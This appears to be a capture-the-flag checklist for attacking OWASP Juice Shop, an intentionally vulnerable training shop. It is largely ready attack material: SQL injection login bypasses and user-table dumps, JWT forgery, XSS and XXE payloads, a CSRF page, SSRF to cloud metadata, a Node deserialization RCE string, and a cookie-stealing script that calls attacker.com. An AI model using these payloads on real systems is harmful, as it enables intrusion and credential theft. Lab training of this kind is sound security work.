# CTF Penetration Testing Checklist - OWASP Juice Shop

## Target: OWASP Juice Shop
**Modern vulnerable web application (Node.js, Express, Angular)**
**URL:** http://localhost:3000 (default)

---

## Overview

OWASP Juice Shop is an intentionally insecure web application featuring:
- 100+ challenges across multiple difficulty levels (⭐ to ⭐⭐⭐⭐⭐⭐)
- OWASP Top 10 vulnerabilities
- Modern tech stack vulnerabilities
- Real-world attack scenarios
- Built-in scoreboard and hints

---

## Phase 1: Information Gathering & Reconnaissance

### 1.1 Initial Reconnaissance
```bash
# Port scanning
nmap -sV -p- [target_ip]

# Web server detection
whatweb http://[target_ip]:3000
curl -I http://[target_ip]:3000

# Technology stack
wappalyzer http://[target_ip]:3000
```

### 1.2 Application Mapping
```bash
# Directory enumeration
gobuster dir -u http://[target_ip]:3000 -w /usr/share/wordlists/dirb/common.txt
dirb http://[target_ip]:3000
feroxbuster -u http://[target_ip]:3000

# Common endpoints found:
# /api
# /rest
# /ftp
# /redirect
# /snippets
# /profile
# /administration
# /socket.io
```

### 1.3 Manual Exploration
```
Key Pages to Explore:
- Main shop page: http://[target_ip]:3000/#/
- Login page: http://[target_ip]:3000/#/login
- Registration: http://[target_ip]:3000/#/register
- Search functionality
- Product reviews
- Contact page
- About page
- Score Board: http://[target_ip]:3000/#/score-board
```

### 1.4 JavaScript Analysis
```bash
# View source code
curl http://[target_ip]:3000 | grep -i "script"

# Download JS files
wget http://[target_ip]:3000/main.js
wget http://[target_ip]:3000/vendor.js
wget http://[target_ip]:3000/polyfills.js

# Search for sensitive info in JS
grep -r "api" *.js
grep -r "token" *.js
grep -r "password" *.js
grep -r "admin" *.js
```

### 1.5 Burp Suite Setup
```
1. Configure browser proxy: 127.0.0.1:8080
2. Browse application through Burp
3. Map application structure
4. Analyze requests/responses
5. Check cookies and headers
```

---

## Phase 2: Enumeration & Vulnerability Discovery

### 2.1 Score Board Discovery ⭐
```
# Access hidden score board
http://[target_ip]:3000/#/score-board

# Or find in main.js
grep -i "score" main.js
```

### 2.2 Admin Section Discovery ⭐⭐
```
# Hidden admin page
http://[target_ip]:3000/#/administration

# Find in JavaScript files or robots.txt
```

### 2.3 API Endpoints Enumeration
```bash
# REST API endpoints
curl http://[target_ip]:3000/rest/admin/application-version
curl http://[target_ip]:3000/api/Challenges
curl http://[target_ip]:3000/api/SecurityQuestions
curl http://[target_ip]:3000/api/SecurityAnswers
curl http://[target_ip]:3000/api/Users
curl http://[target_ip]:3000/api/Products
curl http://[target_ip]:3000/api/Feedbacks
curl http://[target_ip]:3000/api/BasketItems
curl http://[target_ip]:3000/api/Quantitys

# FTP directory
http://[target_ip]:3000/ftp
```

### 2.4 User Enumeration
```bash
# Registration page testing
# Try registering with common usernames
admin@juice-sh.op
administrator@juice-sh.op

# SQL injection in login
admin'--
' OR 1=1--
```

### 2.5 Technology Stack Analysis
```
Identified Technologies:
- Frontend: Angular, Bootstrap
- Backend: Node.js, Express
- Database: SQLite
- Session: JWT (JSON Web Tokens)
- Payment: PayPal (sandbox)
```

---

## Phase 3: Exploitation

### 3.1 SQL Injection Attacks

#### 3.1.1 Login Bypass ⭐⭐
```sql
# Login as admin
Email: admin'--
Password: anything

# Or
Email: ' OR 1=1--
Password: anything

# Login as specific user (Bender)
Email: bender@juice-sh.op'--
Password: anything
```

#### 3.1.2 Search SQL Injection ⭐⭐
```sql
# In search box
'))--
')) UNION SELECT NULL--
')) UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--

# Extract data
')) UNION SELECT id, email, password, NULL, NULL, NULL, NULL, NULL, NULL FROM Users--
```

#### 3.1.3 User Registration SQL Injection ⭐⭐⭐
```sql
# Register with SQL injection in email
admin@juice-sh.op'--
```

### 3.2 Authentication Bypass

#### 3.2.1 JWT Token Manipulation ⭐⭐⭐
```bash
# Capture JWT token from cookie/localStorage
# Decode JWT at jwt.io

# Common JWT exploits:
# 1. Change "alg" to "none"
# 2. Modify payload (change email to admin)
# 3. Brute force secret key

# Tool: jwt_tool
python3 jwt_tool.py [token] -T

# Change user to admin
python3 jwt_tool.py [token] -I -pc email -pv admin@juice-sh.op
```

#### 3.2.2 Password Reset Bypass ⭐⭐⭐
```
1. Request password reset for admin
2. Guess/research security answer
   - Jim's security answer: "Samuel"
   - Bender's security answer: "Stop'n'Drop"
3. Reset password
```

#### 3.2.3 OAuth Bypass ⭐⭐⭐⭐
```
# OAuth token manipulation
# Intercept OAuth callback
# Modify state parameter
```

### 3.3 Broken Access Control

#### 3.3.1 Admin Access ⭐⭐
```
# Access admin panel
http://[target_ip]:3000/#/administration

# Delete user feedbacks
DELETE /api/Feedbacks/[id]
```

#### 3.3.2 View Another User's Basket ⭐⭐
```javascript
# Intercept basket request
GET /rest/basket/[basket_id]

# Change basket_id to another user's ID
GET /rest/basket/2
GET /rest/basket/3
```

#### 3.3.3 Access Another User's Order History ⭐⭐⭐
```javascript
# Intercept order request
GET /rest/order-history

# Manipulate user ID in request
```

#### 3.3.4 Manipulate Basket ⭐⭐⭐
```javascript
# Change product price
PUT /api/BasketItems/[id]
{
  "ProductId": 1,
  "BasketId": 1,
  "quantity": 1,
  "price": 0.01  // Change to low price
}
```

### 3.4 Cross-Site Scripting (XSS)

#### 3.4.1 Reflected XSS ⭐⭐
```javascript
# In search bar
<script>alert('XSS')</script>
<iframe src="javascript:alert('XSS')">

# Order ID tracking
<iframe src="javascript:alert('XSS')">
```

#### 3.4.2 DOM XSS ⭐⭐⭐
```javascript
# In search with # fragment
#<script>alert('XSS')</script>
```

#### 3.4.3 Persistent XSS ⭐⭐⭐⭐
```javascript
# In product review/feedback
<iframe src="javascript:alert('XSS')">

# In username during registration
<script>alert(document.cookie)</script>
```

#### 3.4.4 XSS in Admin Notification ⭐⭐⭐⭐
```javascript
# Customer feedback with XSS
<iframe src="javascript:alert('XSS')">

# Admin views feedback and XSS executes
```

### 3.5 Sensitive Data Exposure

#### 3.5.1 Confidential Document ⭐
```
# Access FTP directory
http://[target_ip]:3000/ftp

# Download files:
# - acquisitions.md
# - coupons_2013.md.bak
# - eastere.gg
# - incident-support.kdbx
# - package.json.bak
```

#### 3.5.2 Exposed Metrics ⭐
```
# Prometheus metrics
http://[target_ip]:3000/metrics
```

#### 3.5.3 Database Schema ⭐⭐
```sql
# SQL injection to dump schema
')) UNION SELECT sql, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sqlite_master--
```

#### 3.5.4 Password Hash Extraction ⭐⭐⭐
```sql
# Extract user passwords
')) UNION SELECT email, password, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users--

# Crack hashes using hashcat/john
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 3.6 XML External Entity (XXE) ⭐⭐⭐⭐

#### 3.6.1 XXE in File Upload
```xml
# Upload XML file with XXE payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <name>&xxe;</name>
</root>
```

#### 3.6.2 XXE via Complaint Form
```xml
# XML payload in complaint
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<complaint>
  <message>&xxe;</message>
</complaint>
```

### 3.7 Security Misconfiguration

#### 3.7.1 Error Handling ⭐
```
# Trigger error messages
http://[target_ip]:3000/rest/user/whoami
http://[target_ip]:3000/api/Users/999999
```

#### 3.7.2 Deprecated API ⭐⭐
```bash
# B2B API endpoint
curl -X POST http://[target_ip]:3000/b2b/v2/orders \
  -H "Content-Type: application/json"
```

#### 3.7.3 Security Headers ⭐
```bash
# Check missing security headers
curl -I http://[target_ip]:3000

# Missing:
# - Content-Security-Policy
# - X-Frame-Options
# - X-Content-Type-Options
```

### 3.8 Injection Attacks

#### 3.8.1 NoSQL Injection ⭐⭐⭐
```javascript
# Login with NoSQL injection
{"email": {"$ne": null}, "password": {"$ne": null}}
```

#### 3.8.2 Command Injection ⭐⭐⭐⭐
```bash
# In vulnerable endpoints
; ls -la
| whoami
& cat /etc/passwd
```

#### 3.8.3 LDAP Injection ⭐⭐⭐
```
# In search fields
*)(uid=*))(|(uid=*
```

### 3.9 File Upload Vulnerabilities

#### 3.9.1 Unrestricted File Upload ⭐⭐⭐
```bash
# Upload malicious files
# Change extension: shell.php.jpg
# Bypass MIME type check
# Upload executable content
```

#### 3.9.2 XXE via File Upload ⭐⭐⭐⭐
```xml
# Upload XML with XXE
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "file:///etc/passwd">
<data>&send;</data>
```

#### 3.9.3 ZIP Slip ⭐⭐⭐⭐⭐
```bash
# Create malicious ZIP
# Include path traversal: ../../../../evil.sh
```

### 3.10 Business Logic Flaws

#### 3.10.1 Negative Quantity ⭐⭐⭐
```javascript
# Add item with negative quantity
POST /api/BasketItems
{
  "ProductId": 1,
  "BasketId": 1,
  "quantity": -10
}
```

#### 3.10.2 Coupon Code Manipulation ⭐⭐
```
# Guess coupon codes from FTP:
# - WMNSDY2019
# - pes[Bh.u*t"v
```

#### 3.10.3 Payment Bypass ⭐⭐⭐⭐
```javascript
# Manipulate payment amount
# Change total to 0 or negative
```

### 3.11 API Abuse

#### 3.11.1 Rate Limiting ⭐⭐
```bash
# Brute force endpoints without rate limiting
for i in {1..1000}; do
  curl -X POST http://[target_ip]:3000/rest/user/login \
    -d '{"email":"admin@juice-sh.op","password":"test'$i'"}'
done
```

#### 3.11.2 Mass Assignment ⭐⭐⭐
```javascript
# Add extra parameters
POST /api/Users
{
  "email": "test@test.com",
  "password": "Test123!",
  "isAdmin": true,  // Extra parameter
  "role": "admin"
}
```

#### 3.11.3 IDOR (Insecure Direct Object Reference) ⭐⭐
```bash
# Access other users' data
GET /api/Users/1
GET /api/Users/2
GET /api/Feedbacks/1
GET /rest/basket/2
```

### 3.12 Client-Side Security

#### 3.12.1 DOM Manipulation ⭐
```javascript
# Browser console
localStorage.setItem('token', 'fake-token')
document.cookie = "admin=true"
```

#### 3.12.2 JavaScript Validation Bypass ⭐⭐
```javascript
# Disable client-side validation
# Modify JavaScript variables
# Intercept and modify requests
```

### 3.13 CAPTCHA Bypass ⭐⭐⭐
```javascript
// Analyze CAPTCHA implementation
// Look for:
// - Client-side validation only
// - Reusable tokens
// - Missing server-side verification
```

### 3.14 CSRF (Cross-Site Request Forgery) ⭐⭐⭐⭐
```html
<!-- Create malicious page -->
<html>
<body>
<form action="http://[target_ip]:3000/api/Users/1" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com" />
  <input type="submit" value="Click me!" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### 3.15 Server-Side Request Forgery (SSRF) ⭐⭐⭐⭐⭐
```javascript
// Redirect functionality
POST /redirect
{
  "url": "http://localhost:3000/admin"
}

// Or internal services
{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

---

## Phase 4: Post-Exploitation & Advanced Challenges

### 4.1 Challenge Categories

#### ⭐ Easy Challenges (1 star)
- Find Score Board
- Provoke error message
- Access confidential document
- XSS in search
- Admin section discovery

#### ⭐⭐ Medium Challenges (2 stars)
- SQL injection login bypass
- View another user's basket
- Access admin section
- Password strength (weak passwords)
- Product tampering

#### ⭐⭐⭐ Hard Challenges (3 stars)
- JWT manipulation
- Change product price in basket
- Persistent XSS
- NoSQL injection
- IDOR vulnerabilities

#### ⭐⭐⭐⭐ Expert Challenges (4 stars)
- XXE attacks
- CSRF token bypass
- OAuth vulnerabilities
- Two-factor authentication bypass
- RCE via file upload

#### ⭐⭐⭐⭐⭐ Advanced Challenges (5+ stars)
- SSRF
- Prototype pollution
- Race conditions
- Deserialization attacks
- Advanced cryptographic attacks

### 4.2 Data Exfiltration

#### 4.2.1 User Database Dump
```sql
')) UNION SELECT 
  GROUP_CONCAT(email || ':' || password) 
FROM Users--
```

#### 4.2.2 Export All Data
```bash
# Use Burp Suite Repeater
# Extract all tables via SQL injection
# Tables: Users, Products, Feedbacks, BasketItems, etc.
```

#### 4.2.3 Download All Files
```bash
# FTP directory enumeration
curl http://[target_ip]:3000/ftp/
wget -r http://[target_ip]:3000/ftp/
```

### 4.3 Maintaining Access

#### 4.3.1 Create Admin User
```javascript
POST /api/Users
{
  "email": "backdoor@juice-sh.op",
  "password": "Backdoor123!",
  "isAdmin": true
}
```

#### 4.3.2 JWT Token Persistence
```javascript
// Store valid admin JWT
localStorage.setItem('token', '[admin-jwt-token]')
```

#### 4.3.3 Persistent XSS Backdoor
```javascript
// Plant XSS that steals credentials
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

### 4.4 Advanced Exploitation Techniques

#### 4.4.1 Prototype Pollution ⭐⭐⭐⭐⭐
```javascript
// Pollute Object prototype
{
  "__proto__": {
    "isAdmin": true
  }
}
```

#### 4.4.2 Race Condition ⭐⭐⭐⭐⭐
```bash
# Multiple simultaneous requests
# Use Burp Intruder with null payloads
# Exploit race condition in order processing
```

#### 4.4.3 Deserialization Attack ⭐⭐⭐⭐⭐
```javascript
// Malicious serialized object
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()"}
```

---

## Tools & Automation

### 5.1 Burp Suite Configuration
```
Extensions to install:
- JWT Editor
- Autorize (authorization testing)
- Turbo Intruder
- SQL Injection Scanner
- XSS Validator
```

### 5.2 Automated Scanners
```bash
# OWASP ZAP
zap-cli quick-scan http://[target_ip]:3000

# Nikto
nikto -h http://[target_ip]:3000

# SQLMap
sqlmap -u "http://[target_ip]:3000/rest/products/search?q=test" --batch

# XSStrike
python3 xsstrike.py -u "http://[target_ip]:3000/#/search?q=test"
```

### 5.3 Custom Scripts
```python
# Python script for API enumeration
import requests

base_url = "http://localhost:3000"
endpoints = ['/api/Users', '/api/Products', '/api/Feedbacks']

for endpoint in endpoints:
    response = requests.get(base_url + endpoint)
    print(f"{endpoint}: {response.status_code}")
```

### 5.4 Browser Developer Tools
```javascript
// Console commands
localStorage.getItem('token')
document.cookie
Object.keys(localStorage)
sessionStorage
```

---

## Common Passwords & Credentials

### Default Admin Account
```
Email: admin@juice-sh.op
Password: (SQL injection bypass: admin'--)
```

### Weak User Passwords
```
jim@juice-sh.op : ncc-1701
bender@juice-sh.op : OhG0dSpaceCakes
```

### Security Answers
```
Jim: Samuel (Captain Kirk's middle name)
Bender: Stop'n'Drop
```

---

## Score Board Hints

### Accessing Hints
```
Each challenge has hints available at:
http://[target_ip]:3000/#/score-board

Click on any challenge for:
- Difficulty rating
- Category
- Tutorial/Walkthrough link
- Hints (may require enabling)
```

---

## Pro Tips for OWASP Juice Shop

1. **Enable Score Board First** - Track your progress
2. **Use Burp Suite** - Intercept all requests
3. **Read JavaScript Files** - Lots of secrets hidden there
4. **Check Every API Endpoint** - Manual enumeration is key
5. **SQL Injection Everywhere** - Try ' OR 1=1-- in all inputs
6. **JWT Tokens** - Always check and decode them
7. **Client-Side Validation** - Can always be bypassed
8. **FTP Directory** - Contains useful files and hints
9. **Error Messages** - Reveal valuable information
10. **Think Outside the Box** - Some challenges need creativity
11. **Use Browser DevTools** - Inspect network traffic
12. **Check Source Code** - Available on GitHub for learning
13. **Follow OWASP Top 10** - Challenges map to real vulnerabilities
14. **Start Easy, Go Hard** - Complete ⭐ challenges first
15. **Read Hints** - If stuck, hints are there to help

---

## Challenge Completion Checklist

### Injection ✓
- [ ] SQL Injection (Login)
- [ ] SQL Injection (Search)
- [ ] NoSQL Injection
- [ ] Command Injection
- [ ] XXE Injection

### Broken Authentication ✓
- [ ] Admin login bypass
- [ ] JWT manipulation
- [ ] Password reset
- [ ] OAuth bypass
- [ ] 2FA bypass

### Sensitive Data Exposure ✓
- [ ] Access confidential documents
- [ ] Extract password hashes
- [ ] Database schema dump
- [ ] Exposed metrics
- [ ] Source code disclosure

### XML External Entities (XXE) ✓
- [ ] XXE in file upload
- [ ] XXE in complaint form

### Broken Access Control ✓
- [ ] View other user's basket
- [ ] Access admin panel
- [ ] Manipulate basket prices
- [ ] IDOR vulnerabilities

### Security Misconfiguration ✓
- [ ] Error handling
- [ ] Missing security headers
- [ ] Deprecated APIs
- [ ] Directory listing

### Cross-Site Scripting (XSS) ✓
- [ ] Reflected XSS
- [ ] DOM XSS
- [ ] Persistent XSS
- [ ] XSS in admin panel

### Insecure Deserialization ✓
- [ ] Node.js deserialization
- [ ] Prototype pollution

### Using Components with Known Vulnerabilities ✓
- [ ] Vulnerable dependencies
- [ ] Outdated libraries

### Insufficient Logging & Monitoring ✓
- [ ] No audit logs
- [ ] Missing security events

---

## Resources

### Official Resources
- GitHub: https://github.com/juice-shop/juice-shop
- Documentation: https://pwning.owasp-juice.shop
- Community: https://owasp.org/www-project-juice-shop/

### Learning Materials
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Juice Shop CTF Guide: https://pwning.owasp-juice.shop/companion-guide/
- Video Tutorials: YouTube (search "OWASP Juice Shop")

### Practice Platforms
- Hosted version: https://juice-shop.herokuapp.com
- Docker: `docker pull bkimminich/juice-shop`
- Local install: `npm install -g juice-shop`

---

## Attack Flow Summary

```
1. Reconnaissance
   ↓
2. Find Score Board ⭐
   ↓
3. SQL Injection Login ⭐⭐
   ↓
4. Access Admin Panel ⭐⭐
   ↓
5. Extract User Data ⭐⭐⭐
   ↓
6. XSS Attacks ⭐⭐⭐
   ↓
7. JWT Manipulation ⭐⭐⭐
   ↓
8. XXE & Advanced ⭐⭐⭐⭐⭐
   ↓
9. Complete All Challenges! 🎉
```